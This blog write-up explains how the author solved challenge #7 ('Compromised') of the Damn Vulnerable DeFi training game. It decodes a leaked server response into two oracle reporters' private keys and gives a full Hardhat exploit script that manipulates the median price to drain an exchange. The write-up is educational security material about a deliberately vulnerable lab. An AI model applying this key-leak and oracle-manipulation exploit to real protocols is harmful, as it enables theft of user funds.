@@ -1,0 +1,206 @@
+# Damn Vulnerable DeFi V2 - #7 Compromised
+
+<p className="text-xs text-right">February 22, 2022 by [patrickd](/about#patrickd)</p>
+
+This is part 4 of the write-up series on Damn Vulnerable DeFi V2. Please consider attempting to solve it on your own first since it's a lot less fun after being spoiled!
+
+---
+
+
+>[**Challenge #7 - Compromised**](https://www.damnvulnerabledefi.xyz/challenges/7.html)
+>
+>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:
+>
+>```plaintext
+>HTTP/2 200 OK
+>content-type: text/html
+>content-language: en
+>vary: Accept-Encoding
+>server: cloudflare
+>
+>4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+>
+>4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
+>
+>```
+>
+>A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each
+>
+>This price is fetched from an on-chain oracle, and is based on three trusted reporters: `0xA73209FB1a42495120166736362A1DfA9F95A105`,`0xe92401A4d3af5E446d93D11EEc806b1462b39D15` and `0x81A5D6E50C214044bE44cA0CB057fe119097850c`.
+>
+>Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.
+
+---
+
+This might be the most obscure challenge so far throwing some strings of hexdecimal characters at us right at the start. So what might they be? First thing to notice is that both start with `4d 48` and a quick google search for these two characters leads to a whole bunch of other Damn Vulnerable Defi write-ups – so let's quickly abandon that lead to not get spoiled.
+
+Maybe decoding them to ascii will reveal something?
+
+```bash
+ubuntu@damnvulndefi:~/damn-vulnerable-defi$ echo "4d 48 68 6a ... 7a 4e 57 45 35"  | xxd -r -p
+MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
+
+ubuntu@damnvulndefi:~/damn-vulnerable-defi$ echo "4d 48 67 79 ... 69 59 6a 51 34"  | xxd -r -p
+MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
+```
+
+Well it's certainly interesting that this yields readable strings, but they seem too long to be a private keys and too short to be signed transactions..
+
+---
+
+## Code Review
+
+For now, let's move on to reviewing the [testcases](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/compromised/compromised.challenge.js), the setup of the challenge scenario is quite a bit of code but it can basically be summarized as follows:
+
+1. Each of the above mentioned oracle "trusted reporter" addresses is given 2 ether.
+2. Attacker EOA account is given 0.1 ether.
+3. A `TrustfulOracleInitializer` contract is deployed with the "trusted reporter" addresses,  `"DVNFT"` as token symbol and the initial price if 999 ether as parameters. It appears that this contract also deploys `TrustfulOracle` during construction.
+4. Finally a `Exchange` contract is deployed with an initial balance of 9999 ether and it seems to deploy a `DamnValuableNFT` during construction.
+
+The success conditions are that, as described above, the Exchange had all its ether stolen and moved to the attacker's account. Additionally, once everything is over, the attacker may not own any NFT and, quite interestingly, the price of the NFTs according to the oracle's `getMedianPrice()` function must not have changed from the initial price. I had initially expected that some kind of oracle price manipulation would be the goal, but maybe not?
+
+---
+
+The [`TrustfulOracleInitializer` contract](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/compromised/TrustfulOracleInitializer.sol) doesn't seem to do much: It has a constructor in which `TrustfulOracle` is first deployed, then an `setupInitialPrices()` function is called (we should check whether it can be called again after initialization) and finally a `NewTrustfulOracle` event is emitted:
+
+```solidity filename="TrustfulOracleInitializer.sol"
+oracle = new TrustfulOracle(sources, true);
+oracle.setupInitialPrices(sources, symbols, initialPrices);
+emit NewTrustfulOracle(address(oracle));
+```
+
+The [`TrustfulOracle` contract](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/compromised/TrustfulOracle.sol) appears a lot more complex. It extends [OpenZepplin's `AccessControlEnumerable`](https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControlEnumerable) adding an access roles system that allows enumeration of addresses assigned to each role.
+
+One role is `INITIALIZER_ROLE` which is temporarily assigned to the `TrustfulOracleInitializer` during construction, a requirement for calling `setupInitialPrices()`, and once initialized it's immediately revoked again. This logic does not appear to have any issues, so we can't make use of any re-initialization vulnerability.
+
+The second role is `TRUSTED_SOURCE_ROLE` which each of the oracle's "trusted reporter" addresses is assigned to. This role is required for calling the `postPrice()` function that allows updating a symbol's price.
+
+But that's just about it really, most of the other functions are `view` or `internal` and not doing much. We can come back to them once we find out which of these are actually used by the Exchange we're supposed to exploit.
+
+---
+
+The [`Exchange` contract](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/compromised/Exchange.sol) is quite simple and can be reduced to the following essential parts to understand:
+
+```solidity filename="Exchange.sol"
+contract Exchange is ReentrancyGuard {
+    ...
+
+    function buyOne() external payable nonReentrant returns (uint256) {
+        ...
+
+        // Price should be in [wei / NFT]
+        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
+        require(amountPaidInWei >= currentPriceInWei, "Amount paid is not enough");
+
+        uint256 tokenId = token.safeMint(msg.sender);
+
+        ...
+    }
+
+    function sellOne(uint256 tokenId) external nonReentrant {
+        require(msg.sender == token.ownerOf(tokenId), "Seller must be the owner");
+        require(token.getApproved(tokenId) == address(this), "Seller must have approved transfer");
+
+        // Price should be in [wei / NFT]
+        uint256 currentPriceInWei = oracle.getMedianPrice(token.symbol());
+        require(address(this).balance >= currentPriceInWei, "Not enough ETH in balance");
+
+        token.transferFrom(msg.sender, address(this), tokenId);
+        token.burn(tokenId);
+
+        payable(msg.sender).sendValue(currentPriceInWei);
+
+        ...
+    }
+...
+```
+
+In simple terms, this contract allows us to buy and sell DVNFT tokens for whatever the oracle claims the current median price is. Since we're supposed to drain all ether from this contract, we'll likely need to use `sellOne()` as part of the exploit.
+
+---
+
+For completeness, let's also look at the [DamnValuableNFT contract](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/contracts/DamnValuableNFT.sol) which only appears to have one significant function:
+
+```solidity filename="DamnValuableNFT.sol"
+function safeMint(address to) public onlyRole(MINTER_ROLE) returns (uint256) {
+    uint256 tokenId = _tokenIdCounter.current();
+    _safeMint(to, tokenId);
+    _tokenIdCounter.increment();
+    return tokenId;
+}
+```
+
+---
+
+## Decoding leaked secrets
+
+So far I've not been able to identify any critical issue in the smart contract implementation itself. Guessing from the challenge's title "Compromised" I still think the key to solving it lies behind the 2 strings we were given at the beginning. They probably allow us to somehow compromise the oracle's trusted reporters and post incorrect prices, which would also explain why each of those accounts are given 2 ether at initialization of the scenario. On the other hand I wonder why the success conditions require the price to be the same as the initialization price; why would the challenge require us to reset the price after the exploit has happened?
+
+At this point I kept looking at my cryptography notes, tools and scripts for private key recovery, thinking that I might be able to plug those hex values into some of them, when I read "base64" somewhere and then remembered that it was weird that those strings are perfectly fine when encoded to ascii. And yes, in hindsight, it should've been obvious even without the typical base64 `=` padding character that both of these strings can be decoded yielding two hexdecimal numbers:
+
+```bash
+ubuntu@damnvulndefi:~/damn-vulnerable-defi$ echo "MHhjNjc4ZWY...NDczNWE5" | base64 --decode
+0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
+
+ubuntu@damnvulndefi:~/damn-vulnerable-defi$ echo "MHgyMDgyNDJ...zNDBiYjQ" | base64 --decode
+0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
+```
+
+These sure look a lot like 32 byte long private keys! Pasting them into [eth-toolbox.com](https://eth-toolbox.com/) we can see that these are indeed private keys for the trusted reporter addresses `0xe92401a4d3af5e446d93d11eec806b1462b39d15` and `0x81a5d6e50c214044be44ca0cb057fe119097850c`!
+
+---
+
+## Exploit
+
+Two out of three price reporters are now compromised and we can use them to call `postPrice()` to manipulate the NFT price for the exchange's selling and buying functions.
+
+The median of three prices is always the one in the middle of a sorted array. So initially it's 999 from `[999, 999, 999]`. We can report 0 as a price twice in order to end up with a median price of 0 (`[0, 0, 999]`). After we bought an NFT for free, we can raise the price to 9999 in order to sell it again for all of the exchange's funds (`[999, 9999, 9999]`).
+
+```javascript filename="compromised.challenge.js"
+it('Exploit', async function () {
+    // Gain access to oracle's price sources.
+    const source1 = new ethers.Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
+    const source2 = new ethers.Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
+
+    // Set NFT median price to 1 wei.
+    await this.oracle.connect(source1).postPrice("DVNFT", 1);
+    await this.oracle.connect(source2).postPrice("DVNFT", 1);
+
+    // Buy 1 NFT for 1 wei.
+    await this.exchange.connect(attacker).buyOne({value: 1});
+
+    // Set NFT median price to 9999 ether + 1 wei.
+    await this.oracle.connect(source1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.add(1));
+    await this.oracle.connect(source2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE.add(1));
+
+    // Sell NFT #0 for 9999 ether + 1 wei to completely drain.
+    await this.nftToken.connect(attacker).approve(this.exchange.address, 0)
+    await this.exchange.connect(attacker).sellOne(0);
+
+    // Reset price to initial 999 ether.
+    await this.oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+    await this.oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+});
+```
+
+While writing the exploit I noticed that we can't actually exploit it with 0 as a price since `buyOne()` has a check that ensures the sent value must be bigger than 0. So instead we'll set 1 wei as a price, which is just about the same as nothing as well.
+
+```bash
+ubuntu@damnsvulndefi:~/damn-vulnerable-defi$ yarn run compromised
+yarn run v1.22.17
+$ yarn hardhat test test/compromised/compromised.challenge.js
+$ /home/ubuntu/damn-vulnerable-defi/node_modules/.bin/hardhat test test/compromised/compromised.challenge.js
+
+
+  Compromised challenge
+    ✓ Exploit (189ms)
+
+
+  1 passing (1s)
+
+Done in 2.47s.
+```
+
+## Conclusion
+
+Well, the obscurity of having to decode private keys from a "data leak" aside, this challenge was actually quite easy once you figure out the trick. Consider watching OpenZeppelin's workshop on [The Dangers of Price Oracles in Smart Contracts](https://www.youtube.com/watch?v=YGO7nzpXCeA) to learn more about secure design and integration of oracles.
